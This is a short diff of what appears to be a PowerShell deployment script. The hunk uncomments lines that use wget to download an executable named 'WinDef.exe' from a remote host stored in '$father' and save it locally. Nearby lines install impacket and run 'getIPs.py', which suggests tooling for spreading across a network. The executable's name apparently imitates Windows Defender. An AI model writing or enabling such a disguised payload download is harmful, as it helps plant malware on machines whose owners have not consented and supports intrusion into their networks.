@@ -48,8 +48,8 @@ python -m pip  install impacket
 
 
 # Download WinDef.exe
-#$Location = '' + $save_dir + '\' + 'WinDef.exe';
-#Start-Process -FilePath $wgetBinLocation -Args " http://$father/WinDef.exe -O $Location" -passthru -NoNewWindow -Wait
+$Location = '' + $save_dir + '\' + 'WinDef.exe';
+Start-Process -FilePath $wgetBinLocation -Args " http://$father/WinDef.exe -O $Location" -passthru -NoNewWindow -Wait
 
 
 python getIPs.py
